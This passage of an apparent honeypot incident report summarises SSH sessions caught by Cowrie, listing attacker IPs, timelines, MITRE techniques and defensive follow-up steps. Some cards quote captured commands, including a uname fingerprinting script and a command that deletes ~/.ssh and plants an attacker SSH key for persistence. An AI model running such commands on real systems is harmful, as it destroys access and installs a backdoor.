| `2026-09-21 18:26:12` | `cowrie.command.input` |
| `2026-09-21 18:26:12` | `cowrie.command.input` |
| `2026-09-21 18:26:12` | `cowrie.command.success` |
| `2026-09-21 18:26:12` | `cowrie.command.input` |
| `2026-09-21 18:26:12` | `cowrie.command.input` |
| `2026-09-21 18:26:12` | `cowrie.command.input` |
| `2026-09-21 18:26:12` | `cowrie.command.input` |
| `2026-09-21 18:26:12` | `cowrie.log.closed` |
| `2026-09-21 18:26:16` | `cowrie.session.params` |
| `2026-09-21 18:26:16` | `cowrie.command.input` |
| `2026-09-21 18:26:18` | `cowrie.log.closed` |
| `2026-09-21 18:26:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70ba99db759c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-09-21 18:27 |
| **Last Seen** | 2026-09-21 18:32 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:27:23` | `cowrie.session.connect` |
| `2026-09-21 18:27:24` | `cowrie.client.version` |
| `2026-09-21 18:27:24` | `cowrie.client.kex` |
| `2026-09-21 18:27:27` | `cowrie.login.success` |
| `2026-09-21 18:27:29` | `cowrie.session.params` |
| `2026-09-21 18:27:29` | `cowrie.command.input` |
| `2026-09-21 18:27:29` | `cowrie.command.input` |
| `2026-09-21 18:27:29` | `cowrie.command.input` |
| `2026-09-21 18:27:29` | `cowrie.command.input` |
| `2026-09-21 18:27:29` | `cowrie.command.input` |
| `2026-09-21 18:27:29` | `cowrie.command.success` |
| `2026-09-21 18:27:29` | `cowrie.command.input` |
| `2026-09-21 18:27:29` | `cowrie.command.input` |
| `2026-09-21 18:27:29` | `cowrie.command.input` |
| `2026-09-21 18:27:29` | `cowrie.command.input` |
| `2026-09-21 18:27:31` | `cowrie.log.closed` |
| `2026-09-21 18:32:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aa9a3097559

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-21 18:28 |
| **Last Seen** | 2026-09-21 18:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:28:57` | `cowrie.session.connect` |
| `2026-09-21 18:28:57` | `cowrie.client.version` |
| `2026-09-21 18:28:57` | `cowrie.client.kex` |
| `2026-09-21 18:28:57` | `cowrie.login.success` |
| `2026-09-21 18:28:57` | `cowrie.direct-tcpip.request` |
| `2026-09-21 18:28:57` | `cowrie.direct-tcpip.data` |
| `2026-09-21 18:28:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95b961afbf0d

| Field | Detail |
|---|---|
| **Source IP** | `176.65.134[.]121` |
| **First Seen** | 2026-09-21 18:29 |
| **Last Seen** | 2026-09-21 18:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `root, root, admin` |
| **TTPs (MITRE)** | T1078 · T1110.001 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:29:36` | `cowrie.session.connect` |
| `2026-09-21 18:29:37` | `cowrie.login.failed` |
| `2026-09-21 18:29:38` | `cowrie.login.success` |
| `2026-09-21 18:29:38` | `cowrie.session.params` |
| `2026-09-21 18:29:39` | `cowrie.command.input` |
| `2026-09-21 18:29:39` | `cowrie.command.failed` |
| `2026-09-21 18:29:39` | `cowrie.command.input` |
| `2026-09-21 18:29:39` | `cowrie.command.failed` |
| `2026-09-21 18:29:40` | `cowrie.command.input` |
| `2026-09-21 18:29:40` | `cowrie.command.failed` |
| `2026-09-21 18:29:40` | `cowrie.log.closed` |
| `2026-09-21 18:29:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.134[.]121` to AbuseIPDB if not already reported
- [ ] Block `176.65.134[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dbd39fce009

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-09-21 18:35 |
| **Last Seen** | 2026-09-21 18:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:35:31` | `cowrie.session.connect` |
| `2026-09-21 18:35:31` | `cowrie.client.version` |
| `2026-09-21 18:35:31` | `cowrie.client.kex` |
| `2026-09-21 18:35:32` | `cowrie.login.success` |
| `2026-09-21 18:35:33` | `cowrie.session.params` |
| `2026-09-21 18:35:33` | `cowrie.command.input` |
| `2026-09-21 18:35:33` | `cowrie.command.input` |
| `2026-09-21 18:35:33` | `cowrie.command.input` |
| `2026-09-21 18:35:33` | `cowrie.command.input` |
| `2026-09-21 18:35:33` | `cowrie.command.input` |
| `2026-09-21 18:35:33` | `cowrie.command.success` |
| `2026-09-21 18:35:33` | `cowrie.command.input` |
| `2026-09-21 18:35:33` | `cowrie.command.input` |
| `2026-09-21 18:35:33` | `cowrie.command.input` |
| `2026-09-21 18:35:33` | `cowrie.command.input` |
| `2026-09-21 18:35:33` | `cowrie.log.closed` |
| `2026-09-21 18:35:33` | `cowrie.session.params` |
| `2026-09-21 18:35:34` | `cowrie.command.input` |
| `2026-09-21 18:35:34` | `cowrie.log.closed` |
| `2026-09-21 18:35:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87826e4787e1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-09-21 18:35 |
| **Last Seen** | 2026-09-21 18:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:35:34` | `cowrie.session.connect` |
| `2026-09-21 18:35:34` | `cowrie.client.version` |
| `2026-09-21 18:35:34` | `cowrie.client.kex` |
| `2026-09-21 18:35:35` | `cowrie.login.success` |
| `2026-09-21 18:35:36` | `cowrie.session.params` |
| `2026-09-21 18:35:36` | `cowrie.command.input` |
| `2026-09-21 18:35:36` | `cowrie.command.input` |
| `2026-09-21 18:35:36` | `cowrie.command.input` |
| `2026-09-21 18:35:36` | `cowrie.command.input` |
| `2026-09-21 18:35:36` | `cowrie.command.input` |
| `2026-09-21 18:35:36` | `cowrie.command.success` |
| `2026-09-21 18:35:36` | `cowrie.command.input` |
| `2026-09-21 18:35:36` | `cowrie.command.input` |
| `2026-09-21 18:35:36` | `cowrie.command.input` |
| `2026-09-21 18:35:36` | `cowrie.command.input` |
| `2026-09-21 18:35:36` | `cowrie.log.closed` |
| `2026-09-21 18:35:37` | `cowrie.session.params` |
| `2026-09-21 18:35:37` | `cowrie.command.input` |
| `2026-09-21 18:35:37` | `cowrie.log.closed` |
| `2026-09-21 18:35:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb3d91d27e14

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-09-21 18:35 |
| **Last Seen** | 2026-09-21 18:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:35:41` | `cowrie.session.connect` |
| `2026-09-21 18:35:41` | `cowrie.client.version` |
| `2026-09-21 18:35:41` | `cowrie.client.kex` |
| `2026-09-21 18:35:42` | `cowrie.login.success` |
| `2026-09-21 18:35:42` | `cowrie.session.params` |
| `2026-09-21 18:35:42` | `cowrie.command.input` |
| `2026-09-21 18:35:42` | `cowrie.command.input` |
| `2026-09-21 18:35:42` | `cowrie.command.input` |
| `2026-09-21 18:35:42` | `cowrie.command.input` |
| `2026-09-21 18:35:42` | `cowrie.command.input` |
| `2026-09-21 18:35:42` | `cowrie.command.success` |
| `2026-09-21 18:35:42` | `cowrie.command.input` |
| `2026-09-21 18:35:42` | `cowrie.command.input` |
| `2026-09-21 18:35:42` | `cowrie.command.input` |
| `2026-09-21 18:35:42` | `cowrie.command.input` |
| `2026-09-21 18:35:42` | `cowrie.log.closed` |
| `2026-09-21 18:35:43` | `cowrie.session.params` |
| `2026-09-21 18:35:43` | `cowrie.command.input` |
| `2026-09-21 18:35:43` | `cowrie.log.closed` |
| `2026-09-21 18:35:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4e3c7fc096e

| Field | Detail |
|---|---|
| **Source IP** | `104.250.52[.]93` |
| **First Seen** | 2026-09-21 18:45 |
| **Last Seen** | 2026-09-21 18:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Connection:Close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:45:40` | `cowrie.session.connect` |
| `2026-09-21 18:45:40` | `cowrie.login.success` |
| `2026-09-21 18:45:41` | `cowrie.session.params` |
| `2026-09-21 18:45:41` | `cowrie.command.input` |
| `2026-09-21 18:45:41` | `cowrie.command.failed` |
| `2026-09-21 18:45:41` | `cowrie.command.input` |
| `2026-09-21 18:45:46` | `cowrie.log.closed` |
| `2026-09-21 18:45:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.250.52[.]93` to AbuseIPDB if not already reported
- [ ] Block `104.250.52[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b01f47d6ece8

| Field | Detail |
|---|---|
| **Source IP** | `104.250.52[.]93` |
| **First Seen** | 2026-09-21 18:45 |
| **Last Seen** | 2026-09-21 18:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `USER test, USER test, USER test, USER test` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:45:52` | `cowrie.session.connect` |
| `2026-09-21 18:45:53` | `cowrie.login.success` |
| `2026-09-21 18:45:53` | `cowrie.session.params` |
| `2026-09-21 18:45:54` | `cowrie.command.input` |
| `2026-09-21 18:45:54` | `cowrie.command.failed` |
| `2026-09-21 18:45:55` | `cowrie.command.input` |
| `2026-09-21 18:45:55` | `cowrie.command.failed` |
| `2026-09-21 18:45:56` | `cowrie.command.input` |
| `2026-09-21 18:45:56` | `cowrie.command.failed` |
| `2026-09-21 18:45:57` | `cowrie.command.input` |
| `2026-09-21 18:45:57` | `cowrie.command.failed` |
| `2026-09-21 18:45:57` | `cowrie.log.closed` |
| `2026-09-21 18:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.250.52[.]93` to AbuseIPDB if not already reported
- [ ] Block `104.250.52[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4891816bcb96

| Field | Detail |
|---|---|
| **Source IP** | `104.250.52[.]93` |
| **First Seen** | 2026-09-21 18:45 |
| **Last Seen** | 2026-09-21 18:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:45:57` | `cowrie.session.connect` |
| `2026-09-21 18:45:57` | `cowrie.login.success` |
| `2026-09-21 18:45:58` | `cowrie.session.params` |
| `2026-09-21 18:45:58` | `cowrie.log.closed` |
| `2026-09-21 18:45:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.250.52[.]93` to AbuseIPDB if not already reported
- [ ] Block `104.250.52[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc150239634b

| Field | Detail |
|---|---|
| **Source IP** | `104.250.52[.]93` |
| **First Seen** | 2026-09-21 18:45 |
| **Last Seen** | 2026-09-21 18:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:45:59` | `cowrie.session.connect` |
| `2026-09-21 18:45:59` | `cowrie.login.success` |
| `2026-09-21 18:45:59` | `cowrie.session.params` |
| `2026-09-21 18:45:59` | `cowrie.command.input` |
| `2026-09-21 18:46:05` | `cowrie.log.closed` |
| `2026-09-21 18:46:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.250.52[.]93` to AbuseIPDB if not already reported
- [ ] Block `104.250.52[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-912bf7d80c20

| Field | Detail |
|---|---|
| **Source IP** | `147.15.20[.]173` |
| **First Seen** | 2026-09-21 18:50 |
| **Last Seen** | 2026-09-21 18:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:50:50` | `cowrie.session.connect` |
| `2026-09-21 18:50:50` | `cowrie.client.version` |
| `2026-09-21 18:50:51` | `cowrie.client.kex` |
| `2026-09-21 18:50:52` | `cowrie.login.success` |
| `2026-09-21 18:50:52` | `cowrie.session.params` |
| `2026-09-21 18:50:52` | `cowrie.command.input` |
| `2026-09-21 18:50:52` | `cowrie.command.failed` |
| `2026-09-21 18:50:53` | `cowrie.log.closed` |
| `2026-09-21 18:50:53` | `cowrie.session.params` |
| `2026-09-21 18:50:53` | `cowrie.command.input` |
| `2026-09-21 18:50:54` | `cowrie.session.file_download` |
| `2026-09-21 18:50:54` | `cowrie.log.closed` |
| `2026-09-21 18:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.15.20[.]173` to AbuseIPDB if not already reported
- [ ] Block `147.15.20[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30ac59ed2baf

| Field | Detail |
|---|---|
| **Source IP** | `147.15.20[.]173` |
| **First Seen** | 2026-09-21 18:50 |
| **Last Seen** | 2026-09-21 18:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:50:54` | `cowrie.session.connect` |
| `2026-09-21 18:50:54` | `cowrie.client.version` |
| `2026-09-21 18:50:54` | `cowrie.client.kex` |
| `2026-09-21 18:50:55` | `cowrie.login.success` |
| `2026-09-21 18:50:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.15.20[.]173` to AbuseIPDB if not already reported
- [ ] Block `147.15.20[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a827ec607b67

| Field | Detail |
|---|---|
| **Source IP** | `147.15.20[.]173` |
| **First Seen** | 2026-09-21 18:50 |
| **Last Seen** | 2026-09-21 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 18:50:55` | `cowrie.session.connect` |
| `2026-09-21 18:50:55` | `cowrie.client.version` |
| `2026-09-21 18:50:55` | `cowrie.client.kex` |
| `2026-09-21 18:50:56` | `cowrie.login.success` |
| `2026-09-21 18:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.15.20[.]173` to AbuseIPDB if not already reported
- [ ] Block `147.15.20[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `104.194.10[.]16` | **58** | 2026-09-21 13:10 | 2026-09-21 18:51 | 38m | 0 | `T1592` | 🟠 MEDIUM |
| `104.250.52[.]93` | **11** | 2026-09-21 18:45 | 2026-09-21 18:46 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `118.145.237[.]236` | **11** | 2026-09-21 13:48 | 2026-09-21 14:36 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `137.184.5[.]188` | **11** | 2026-09-21 13:04 | 2026-09-21 14:48 | 10m | 0 | `T1592` | 🟠 MEDIUM |
| `137.184.5[.]188` | **7** | 2026-09-21 16:59 | 2026-09-21 18:29 | 7m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | **6** | 2026-09-21 16:49 | 2026-09-21 17:46 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.194.249[.]72` | **5** | 2026-09-21 15:27 | 2026-09-21 15:29 | 1m | 0 | `T1592` | 🟢 LOW |
| `14.48.197[.]109` | **3** | 2026-09-21 14:29 | 2026-09-21 14:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `199.45.154[.]59` | **3** | 2026-09-21 14:23 | 2026-09-21 14:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `199.45.155[.]34` | **3** | 2026-09-21 18:17 | 2026-09-21 18:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]150` | **3** | 2026-09-21 18:12 | 2026-09-21 18:22 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `76.35.80[.]0` | **3** | 2026-09-21 18:11 | 2026-09-21 18:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | **2** | 2026-09-21 16:31 | 2026-09-21 17:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `16.5.0[.]239` | **2** | 2026-09-21 17:23 | 2026-09-21 17:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-09-21 17:40 | 2026-09-21 17:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | **2** | 2026-09-21 14:29 | 2026-09-21 14:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `200.59.113[.]245` | **2** | 2026-09-21 14:12 | 2026-09-21 14:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `4.148.9[.]186` | **2** | 2026-09-21 16:47 | 2026-09-21 16:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.141.118[.]211` | **2** | 2026-09-21 13:28 | 2026-09-21 13:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.141.12[.]219` | **2** | 2026-09-21 14:02 | 2026-09-21 14:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `96.239.112[.]79` | **2** | 2026-09-21 16:46 | 2026-09-21 16:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.12.179[.]53` | 1 | 2026-09-21 16:56 | 2026-09-21 16:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.88.48[.]171` | 1 | 2026-09-21 14:30 | 2026-09-21 14:30 | 30s | 0 | `T1592` | 🟢 LOW |
| `120.48.8[.]170` | 1 | 2026-09-21 15:58 | 2026-09-21 16:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-09-21 13:07 | 2026-09-21 13:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.18.236[.]71` | 1 | 2026-09-21 16:49 | 2026-09-21 16:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `140.246.137[.]102` | 1 | 2026-09-21 13:49 | 2026-09-21 13:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `142.93.218[.]50` | 1 | 2026-09-21 16:25 | 2026-09-21 16:25 | 30s | 0 | `T1592` | 🟢 LOW |
| `144.124.196[.]59` | 1 | 2026-09-21 16:07 | 2026-09-21 16:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `150.241.87[.]180` | 1 | 2026-09-21 15:49 | 2026-09-21 15:49 | 28s | 0 | `T1592` | 🟢 LOW |
| `168.121.220[.]66` | 1 | 2026-09-21 14:01 | 2026-09-21 14:01 | 11s | 0 | `T1592` | 🟢 LOW |
| `176.65.149[.]188` | 1 | 2026-09-21 18:34 | 2026-09-21 18:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.65.149[.]233` | 1 | 2026-09-21 14:18 | 2026-09-21 14:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.98[.]88` | 1 | 2026-09-21 15:29 | 2026-09-21 15:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]206` | 1 | 2026-09-21 15:15 | 2026-09-21 15:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.104.82[.]75` | 1 | 2026-09-21 18:01 | 2026-09-21 18:01 | 13s | 0 | `T1592` | 🟢 LOW |
| `210.99.112[.]82` | 1 | 2026-09-21 14:49 | 2026-09-21 14:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `219.250.188[.]143` | 1 | 2026-09-21 16:53 | 2026-09-21 16:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.26.74[.]162` | 1 | 2026-09-21 18:52 | 2026-09-21 18:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `38.159.57[.]82` | 1 | 2026-09-21 17:54 | 2026-09-21 17:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-09-21 13:05 | 2026-09-21 13:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.62.135[.]24` | 1 | 2026-09-21 12:56 | 2026-09-21 12:56 | 31s | 0 | `T1592` | 🟢 LOW |
| `50.62.135[.]24` | 1 | 2026-09-21 18:45 | 2026-09-21 18:45 | 31s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]122` | 1 | 2026-09-21 18:06 | 2026-09-21 18:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]90` | 1 | 2026-09-21 13:55 | 2026-09-21 13:56 | 16s | 0 | `T1592` | 🟢 LOW |
| `71.6.232[.]22` | 1 | 2026-09-21 14:32 | 2026-09-21 14:32 | 7s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-09-21 18:29 | 2026-09-21 18:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]136` | 1 | 2026-09-21 13:23 | 2026-09-21 13:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.247.182[.]111` | 1 | 2026-09-21 14:19 | 2026-09-21 14:19 | 13s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-09-21 16:24 | 2026-09-21 16:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-09-21 18:28 | 2026-09-21 18:28 | 0s | 0 | `T1592` | 🟢 LOW |
